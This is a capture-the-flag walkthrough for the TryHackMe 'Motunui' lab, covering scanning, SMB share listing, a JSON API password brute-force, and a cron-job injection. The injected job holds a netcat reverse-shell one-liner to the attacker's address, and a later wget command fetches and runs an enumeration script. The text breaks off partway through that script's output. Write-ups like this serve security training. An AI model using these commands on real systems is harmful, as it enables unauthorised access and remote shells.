# Motunui

Can you save the island of Motunui?

[Motunui](https://tryhackme.com/room/motunui)

## Topic's

- Network Enumeration
- SMB Enumeration
- Web Enumeration
- Brute Forcing (Json API)
- Network Forensic

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Motunui

Please wait 5 minutes for this machine to boot :)

Deploy the machine and get root privileges.

```
kali@kali:~/CTFs/tryhackme/Motunui$ sudo nmap -A -sS -sC -sV -O 10.10.220.123
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 09:48 CEST
Nmap scan report for 10.10.220.123
Host is up (0.038s latency).
Not shown: 994 filtered ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:f4:43:ac:39:fe:94:13:7a:ad:3d:e6:5f:b4:7e:71 (RSA)
|   256 49:8c:75:e1:78:e9:72:65:de:c9:14:74:0f:d4:1a:81 (ECDSA)
|_  256 0b:b6:27:f9:ad:ed:22:a9:90:ac:9e:b3:85:1b:aa:96 (ED25519)
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
3000/tcp open  ppp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 174
|     Date: Sun, 18 Oct 2020 07:48:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /nice%20ports%2C/Tri%6Eity.txt%2ebak</pre>
|     </body>
|     </html>
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 18 Oct 2020 07:48:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 18 Oct 2020 07:48:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
5000/tcp open  ssl/http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| ssl-cert: Subject: organizationName=Motunui/stateOrProvinceName=Motunui/countryName=GB
| Not valid before: 2020-08-03T14:58:59
|_Not valid after:  2021-08-03T14:58:59
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=10/18%Time=5F8BF352%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20139\
SF:r\nDate:\x20Sun,\x2018\x20Oct\x202020\x2007:48:35\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTTPOptions,16C,"HTTP/1
SF:\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-src\x
SF:20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20text
SF:/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x201
SF:8\x20Oct\x202020\x2007:48:35\x20GMT\r\nConnection:\x20close\r\n\r\n<!DO
SF:CTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8
SF:\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x20/
SF:</pre>\n</body>\n</html>\n")%r(FourOhFourRequest,18B,"HTTP/1\.1\x20404\
SF:x20Not\x20Found\r\nContent-Security-Policy:\x20default-src\x20'none'\r\
SF:nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20c
SF:harset=utf-8\r\nContent-Length:\x20174\r\nDate:\x20Sun,\x2018\x20Oct\x2
SF:02020\x2007:48:36\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title
SF:>Error</title>\n</head>\n<body>\n<pre>Cannot\x20GET\x20/nice%20ports%2C
SF:/Tri%6Eity\.txt%2ebak</pre>\n</body>\n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MOTUNUI; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: MOTUNUI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: motunui
|   NetBIOS computer name: MOTUNUI\x00
|   Domain name: \x00
|   FQDN: motunui
|_  System time: 2020-10-18T07:49:00+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-18T07:49:00
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   35.52 ms 10.8.0.1
2   35.74 ms 10.10.220.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.69 seconds
```

```
kali@kali:~/CTFs/tryhackme/Motunui$ smbclient -L //10.10.220.123
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        traces          Disk      Network shared files
        IPC$            IPC       IPC Service (motunui server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
kali@kali:~/CTFs/tryhackme/Motunui$ smbclient //10.10.220.123/traces
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 05:48:54 2020
  ..                                  D        0  Thu Jul  9 05:48:27 2020
  moana                               D        0  Thu Jul  9 05:50:12 2020
  maui                                D        0  Mon Aug  3 18:22:03 2020
  tui                                 D        0  Thu Jul  9 05:50:40 2020

                19475088 blocks of size 1024. 11279612 blocks available
smb: \> cd moana\
smb: \moana\> ls
  .                                   D        0  Thu Jul  9 05:50:12 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_64947.pcapng                 N        0  Tue Jul  7 18:51:43 2020
  ticket_31762.pcapng                 N        0  Tue Jul  7 18:51:28 2020

                19475088 blocks of size 1024. 11279612 blocks available
smb: \moana\> mget *
Get file ticket_64947.pcapng?
Get file ticket_31762.pcapng?
smb: \moana\> get ticket_64947.pcapng
getting file \moana\ticket_64947.pcapng of size 0 as ticket_64947.pcapng (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \moana\> get ticket_31762.pcapng
getting file \moana\ticket_31762.pcapng of size 0 as ticket_31762.pcapng (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \moana\> cd ../
smb: \> ls
  .                                   D        0  Thu Jul  9 05:48:54 2020
  ..                                  D        0  Thu Jul  9 05:48:27 2020
  moana                               D        0  Thu Jul  9 05:50:12 2020
  maui                                D        0  Mon Aug  3 18:22:03 2020
  tui                                 D        0  Thu Jul  9 05:50:40 2020

                19475088 blocks of size 1024. 11279608 blocks available
smb: \> cd maui\
smb: \maui\> ls
  .                                   D        0  Mon Aug  3 18:22:03 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_6746.pcapng                  N    79296  Mon Aug  3 18:21:16 2020

                19475088 blocks of size 1024. 11279608 blocks available
smb: \maui\> get ticket_6746.pcapng
getting file \maui\ticket_6746.pcapng of size 79296 as ticket_6746.pcapng (192.2 KiloBytes/sec) (average 124.9 KiloBytes/sec)
smb: \maui\> cd ../tui
smb: \tui\> ls
  .                                   D        0  Thu Jul  9 05:50:40 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_7876.pcapng                  N        0  Tue Jul  7 18:52:24 2020
  ticket_1325.pcapng                  N        0  Tue Jul  7 18:52:30 2020

                19475088 blocks of size 1024. 11279604 blocks available
smb: \tui\> get ticket_7876.pcapng
getting file \tui\ticket_7876.pcapng of size 0 as ticket_7876.pcapng (0.0 KiloBytes/sec) (average 105.9 KiloBytes/sec)
smb: \tui\> get ticket_1325.pcapng
getting file \tui\ticket_1325.pcapng of size 0 as ticket_1325.pcapng (0.0 KiloBytes/sec) (average 92.4 KiloBytes/sec)
smb: \tui\> cd ..
smb: \> recurse
smb: \> ls
  .                                   D        0  Thu Jul  9 05:48:54 2020
  ..                                  D        0  Thu Jul  9 05:48:27 2020
  moana                               D        0  Thu Jul  9 05:50:12 2020
  maui                                D        0  Mon Aug  3 18:22:03 2020
  tui                                 D        0  Thu Jul  9 05:50:40 2020

\moana
  .                                   D        0  Thu Jul  9 05:50:12 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_64947.pcapng                 N        0  Tue Jul  7 18:51:43 2020
  ticket_31762.pcapng                 N        0  Tue Jul  7 18:51:28 2020

\maui
  .                                   D        0  Mon Aug  3 18:22:03 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_6746.pcapng                  N    79296  Mon Aug  3 18:21:16 2020

\tui
  .                                   D        0  Thu Jul  9 05:50:40 2020
  ..                                  D        0  Thu Jul  9 05:48:54 2020
  ticket_7876.pcapng                  N        0  Tue Jul  7 18:52:24 2020
  ticket_1325.pcapng                  N        0  Tue Jul  7 18:52:30 2020

                19475088 blocks of size 1024. 11279604 blocks available
smb: \>
```

![](./maui/dashboard.png)

`10.10.220.123 d3v3lopm3nt.motunui.thm motunui.thm`

```
kali@kali:~/CTFs/tryhackme/Motunui$ sudo gobuster dir -u d3v3lopm3nt.motunui.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://d3v3lopm3nt.motunui.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/18 10:08:47 Starting gobuster
===============================================================
/docs (Status: 301)
/javascript (Status: 301)
Progress: 9935 / 220561 (4.50%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/18 10:09:26 Finished
===============================================================
```

[http://api.motunui.thm:3000/v2/](http://api.motunui.thm:3000/v2/)

[http://api.motunui.thm:3000/v1/login](http://api.motunui.thm:3000/v1/login)

```
kali@kali:~/CTFs/tryhackme/Motunui$ sudo python3 /opt/JSONBrute/src/jsonbrute.py --url http://api.motunui.thm:3000/v2/login --wordlist /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt --data "username=maui, password=FUZZ"  --code 200
[*] Starting JSONBrute on http://api.motunui.thm:3000/v2/login
[+] Found "password": island
```

POST: `http://api.motunui.thm:3000/v2/login`

```json
{
  "username": "maui",
  "password": "island"
}
```

```json
{
  "hash": "aXNsYW5k"
}
```

GET: `http://api.motunui.thm:3000/v2/jobs`

```json
{
  "hash": "aXNsYW5k"
}
```

POST: `http://api.motunui.thm:3000/v2/jobs`

```json
{
  "hash": "aXNsYW5k",
  "job": "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f"
}
```

```json
{
  "job": "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f"
}
```

```
kali@kali:~/CTFs/tryhackme/Motunui$ curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   151  100   151    0     0    427      0 --:--:-- --:--:-- --:--:--   427
100 38430  100 38430    0     0  54743      0 --:--:-- --:--:-- --:--:--  329k
kali@kali:~/CTFs/tryhackme/Motunui$ sudo python3 -m http.server 80
[sudo] password for kali:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.220.123 - - [18/Oct/2020 11:38:12] "GET /lse.sh HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

`wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1`

```
www-data@motunui:~$ wget http://10.8.106.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1
<6.222/lse.sh && chmod +x lse.sh && ./lse.sh -i -l 1
--2020-10-18 09:38:13--  http://10.8.106.222/lse.sh
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38430 (38K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh              100%[===================>]  37.53K  --.-KB/s    in 0.08s

2020-10-18 09:38:13 (482 KB/s) - ‘lse.sh’ saved [38430/38430]


 LSE Version: 2.8

        User: www-data
     User ID: 33
    Password: none
        Home: /var/www
        Path: /usr/bin:/bin
       umask: 0002

    Hostname: motunui
       Linux: 4.15.0-112-generic
Distribution: Ubuntu 18.04.4 LTS
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in an administrative groups?.............. yes!
---
adm:x:4:syslog
---
[*] usr030 Other users with shell.......................................... yes!
---
root:x:0:0:root:/root:/bin/bash
moana:x:1000:1000:Moana:/home/moana:/bin/bash
network:x:1001:1001:,,,:/home/network:/bin/bash
---
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
---
/bin
/sbin
/usr/bin
/usr/games
/usr/local/bin
/usr/local/games
/usr/local/sbin
/usr/sbin
---
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ yes!
---
moana
---
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
---
/tmp
/tmp/quote
/tmp/f
/tmp/.font-unix
/tmp/tmp.GZ5TavHeyh
/tmp/.X11-unix
/tmp/.ICE-unix
/tmp/.XIM-unix
/tmp/tmp.qJ0UOoCXsT
/tmp/.Test-unix
/home/network/traces/maui/ticket_6746.pcapng
/var/tmp
/var/spool/cron/crontabs
/var/spool/samba
/var/crash
/var/lib/php/sessions
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/cache/apache2/mod_cache_disk
/snap/core/9804/dev/full
/snap/core/9804/dev/null
/snap/core/9804/dev/random
/snap/core/9804/dev/tty
/snap/core/9804/dev/urandom
/snap/core/9804/dev/zero
/snap/core/9665/dev/full
/snap/core/9665/dev/null
/snap/core/9665/dev/random
/snap/core/9665/dev/tty
/snap/core/9665/dev/urandom
/snap/core/9665/dev/zero
/run/snapd-snap.socket
/run/snapd.socket
/run/dbus/system_bus_socket
/run/uuidd/request
/run/acpid.socket
/run/screen
/run/samba/nmbd/unexpected
/run/systemd/journal/dev-log
/run/systemd/journal/socket
/run/systemd/journal/stdout
/run/systemd/journal/syslog
/run/systemd/private
/run/systemd/notify
/run/lock
/run/lock/apache2
/etc/network.pkt
---
[*] fst010 Binaries with setuid bit........................................ yes!
---
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/snap/core/9804/bin/mount
/snap/core/9804/bin/ping
/snap/core/9804/bin/ping6
/snap/core/9804/bin/su
/snap/core/9804/bin/umount
/snap/core/9804/usr/bin/chfn
/snap/core/9804/usr/bin/chsh
/snap/core/9804/usr/bin/gpasswd
/snap/core/9804/usr/bin/newgrp
/snap/core/9804/usr/bin/passwd
/snap/core/9804/usr/bin/sudo
/snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9804/usr/lib/openssh/ssh-keysign
/snap/core/9804/usr/lib/snapd/snap-confine
/snap/core/9804/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
---
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/snap/core/9804/bin/mount
/snap/core/9804/bin/ping
/snap/core/9804/bin/ping6
/snap/core/9804/bin/su
/snap/core/9804/bin/umount
/snap/core/9804/usr/bin/chfn
/snap/core/9804/usr/bin/chsh
/snap/core/9804/usr/bin/gpasswd
/snap/core/9804/usr/bin/newgrp
/snap/core/9804/usr/bin/passwd
/snap/core/9804/usr/bin/sudo
/snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9804/usr/lib/openssh/ssh-keysign
/snap/core/9804/usr/lib/snapd/snap-confine
/snap/core/9804/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... yes!
---
total 76
drwxr-xr-x  7 moana moana  4096 Sep 30 23:57 .
drwxr-xr-x  4 root  root   4096 Jul  7 16:32 ..
-rw-------  1 moana moana    74 Sep 30 23:57 .bash_history
-rw-r--r--  1 moana moana   220 Apr  4  2018 .bash_logout
-rw-r--r--  1 moana moana  4004 Aug  3 16:23 .bashrc
drwx------  2 moana moana  4096 Jul  7 16:17 .cache
drwx------  3 moana moana  4096 Jul  7 16:17 .gnupg
drwxrwxr-x  3 moana moana  4096 Sep 30 23:53 .local
-rw-------  1 moana moana    11 Jul  9 01:23 .node_repl_history
drwxrwxr-x 55 moana moana  4096 Jul  8 19:35 .npm
-rw-r--r--  1 moana moana   807 Apr  4  2018 .profile
-rw-r--r--  1 root  root    329 Jul  9 03:00 read_me
-rw-rw-r--  1 moana moana    75 Jul  9 19:47 .selected_editor
drwx------  2 moana moana  4096 Jul  7 16:21 .ssh
-rw-r--r--  1 moana moana     0 Jul  7 16:17 .sudo_as_admin_successful
-rw-rw----  1 moana moana    22 Jul  9 03:03 user.txt
-rw-------  1 root  root  15333 Aug  3 13:40 .viminfo
total 28
drwxr-xr-x 3 network network 4096 Jul  9 03:48 .
drwxr-xr-x 4 root    root    4096 Jul  7 16:32 ..
-rw------- 1 network network  246 Jul  7 17:51 .bash_history
-rw-r--r-- 1 network network  220 Jul  7 16:32 .bash_logout
-rw-r--r-- 1 network network 3771 Jul  7 16:32 .bashrc
-rw-r--r-- 1 network network  807 Jul  7 16:32 .profile
drwxrwxr-x 5 network network 4096 Jul  9 03:48 traces
---
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
---
/usr/bin/curl
/usr/bin/dig
/usr/bin/gcc
/bin/nc.openbsd
/bin/nc
/bin/netcat
/usr/bin/wget
---
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'www-data' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... yes!
---
-rw-r--r-- 1 root root 853 Jul 28  2011 /snap/core/9804/usr/share/doc/abootimg/copyright.gz
-rw-r--r-- 1 root root 437 Aug 25  2009 /snap/core/9804/usr/share/doc/acl/copyright.gz
-rw-r--r-- 1 root root 1004 Jul  2  2015 /snap/core/9804/usr/share/doc/adduser/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9804/usr/share/doc/apparmor/copyright.gz
-rw-r--r-- 1 root root 605 May 13 13:17 /snap/core/9804/usr/share/doc/apt/copyright.gz
-rw-r--r-- 1 root root 669 Sep 30  2019 /snap/core/9804/usr/share/doc/base-files/copyright.gz
-rw-r--r-- 1 root root 463 Nov 21  2015 /snap/core/9804/usr/share/doc/base-passwd/copyright.gz
-rw-r--r-- 1 root root 3077 Mar  3  2014 /snap/core/9804/usr/share/doc/bash/copyright.gz
-rw-r--r-- 1 root root 507 Aug 12  2015 /snap/core/9804/usr/share/doc/bash-completion/copyright.gz
-rw-r--r-- 1 root root 369 Aug 20  2015 /snap/core/9804/usr/share/doc/bridge-utils/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9804/usr/share/doc/bsdutils/copyright.gz
-rw-r--r-- 1 root root 667 Aug  7  2015 /snap/core/9804/usr/share/doc/busybox-initramfs/copyright.gz
-rw-r--r-- 1 root root 1297 Jul  4  2019 /snap/core/9804/usr/share/doc/bzip2/copyright.gz
-rw-r--r-- 1 root root 6202 Dec 20  2015 /snap/core/9804/usr/share/doc/ca-certificates/copyright.gz
-rw-r--r-- 1 root root 164 Dec 20  2015 /snap/core/9804/usr/share/doc/ca-certificates/examples/ca-certificates-local/debian/copyright.gz
-rw-r--r-- 1 root root 909 Sep 14  2015 /snap/core/9804/usr/share/doc/cgmanager/copyright.gz
-rw-r--r-- 1 root root 599 Apr 19  2018 /snap/core/9804/usr/share/doc/cloud-guest-utils/copyright.gz
-rw-r--r-- 1 root root 863 Jun  3 02:44 /snap/core/9804/usr/share/doc/cloud-init/copyright.gz
-rw-r--r-- 1 root root 546 Aug 23  2016 /snap/core/9804/usr/share/doc/console-conf/copyright.gz
-rw-r--r-- 1 root root 2440 Feb 16  2016 /snap/core/9804/usr/share/doc/coreutils/copyright.gz
-rw-r--r-- 1 root root 414 Nov  5  2019 /snap/core/9804/usr/share/doc/cpio/copyright.gz
-rw-r--r-- 1 root root 4864 Aug 23  2014 /snap/core/9804/usr/share/doc/crda/copyright.gz
-rw-r--r-- 1 root root 1749 Apr  5  2016 /snap/core/9804/usr/share/doc/cron/copyright.gz
-rw-r--r-- 1 root root 1586 Feb 17  2016 /snap/core/9804/usr/share/doc/dash/copyright.gz
-rw-r--r-- 1 root root 6833 Oct  7  2019 /snap/core/9804/usr/share/doc/dbus/copyright.gz
-rw-r--r-- 1 root root 1117 Nov  8  2015 /snap/core/9804/usr/share/doc/debconf/copyright.gz
-rw-r--r-- 1 root root 3496 May  6  2009 /snap/core/9804/usr/share/doc/debianutils/copyright.gz
-rw-r--r-- 1 root root 740 Jul 14  2013 /snap/core/9804/usr/share/doc/dh-python/copyright.gz
-rw-r--r-- 1 root root 869 Dec 26  2015 /snap/core/9804/usr/share/doc/diffutils/copyright.gz
-rw-r--r-- 1 root root 602 May  4  2015 /snap/core/9804/usr/share/doc/distro-info-data/copyright.gz
-rw-r--r-- 1 root root 552 Jul 12  2018 /snap/core/9804/usr/share/doc/dnsmasq-base/copyright.gz
-rw-r--r-- 1 root root 778 Aug 14  2015 /snap/core/9804/usr/share/doc/dosfstools/copyright.gz
-rw-r--r-- 1 root root 3021 Jul 16  2019 /snap/core/9804/usr/share/doc/dpkg/copyright.gz
-rw-r--r-- 1 root root 1701 Jun 25  2014 /snap/core/9804/usr/share/doc/e2fslibs/copyright.gz
-rw-r--r-- 1 root root 1701 Jun 25  2014 /snap/core/9804/usr/share/doc/e2fsprogs/copyright.gz
-rw-r--r-- 1 root root 788 Jul 13  2015 /snap/core/9804/usr/share/doc/efibootmgr/copyright.gz
-rw-r--r-- 1 root root 1422 Jan 16  2016 /snap/core/9804/usr/share/doc/findutils/copyright.gz
-rw-r--r-- 1 root root 645 Mar 20  2016 /snap/core/9804/usr/share/doc/fwupdate/copyright.gz
-rw-r--r-- 1 root root 448 Oct 31  2015 /snap/core/9804/usr/share/doc/fwupdate-signed/copyright.gz
-rw-r--r-- 1 root root 716 Apr  8  2014 /snap/core/9804/usr/share/doc/gawk/copyright.gz
-rw-r--r-- 1 root root 8609 Oct  4  2019 /snap/core/9804/usr/share/doc/gcc-5-base/copyright.gz
-rw-r--r-- 1 root root 8610 Apr 15  2016 /snap/core/9804/usr/share/doc/gcc-6-base/copyright.gz
-rw-r--r-- 1 root root 4837 Nov  9  2014 /snap/core/9804/usr/share/doc/gdbserver/copyright.gz
-rw-r--r-- 1 root root 702 May 10  2015 /snap/core/9804/usr/share/doc/gdisk/copyright.gz
-rw-r--r-- 1 root root 1081 Jan  4  2016 /snap/core/9804/usr/share/doc/gettext-base/copyright.gz
-rw-r--r-- 1 root root 1651 Dec 22  2015 /snap/core/9804/usr/share/doc/gnupg/copyright.gz
-rw-r--r-- 1 root root 1651 Dec 22  2015 /snap/core/9804/usr/share/doc/gpgv/copyright.gz
-rw-r--r-- 1 root root 991 Mar  4  2016 /snap/core/9804/usr/share/doc/grep/copyright.gz
-rw-r--r-- 1 root root 660 Dec 25  2013 /snap/core/9804/usr/share/doc/gzip/copyright.gz
-rw-r--r-- 1 root root 636 Sep  1  2015 /snap/core/9804/usr/share/doc/hostname/copyright.gz
-rw-r--r-- 1 root root 672 Nov 30  2016 /snap/core/9804/usr/share/doc/ifupdown/copyright.gz
-rw-r--r-- 1 root root 1064 Feb 29  2016 /snap/core/9804/usr/share/doc/init/copyright.gz
-rw-r--r-- 1 root root 1064 Feb 29  2016 /snap/core/9804/usr/share/doc/init-system-helpers/copyright.gz
-rw-r--r-- 1 root root 541 Oct  7  2019 /snap/core/9804/usr/share/doc/initramfs-tools/copyright.gz
-rw-r--r-- 1 root root 541 Oct  7  2019 /snap/core/9804/usr/share/doc/initramfs-tools-bin/copyright.gz
-rw-r--r-- 1 root root 541 Oct  7  2019 /snap/core/9804/usr/share/doc/initramfs-tools-core/copyright.gz
-rw-r--r-- 1 root root 536 Sep 14  2017 /snap/core/9804/usr/share/doc/initramfs-tools-ubuntu-core/copyright.gz
-rw-r--r-- 1 root root 775 Jan 19  2016 /snap/core/9804/usr/share/doc/initscripts/copyright.gz
-rw-r--r-- 1 root root 488 May  7  2013 /snap/core/9804/usr/share/doc/insserv/copyright.gz
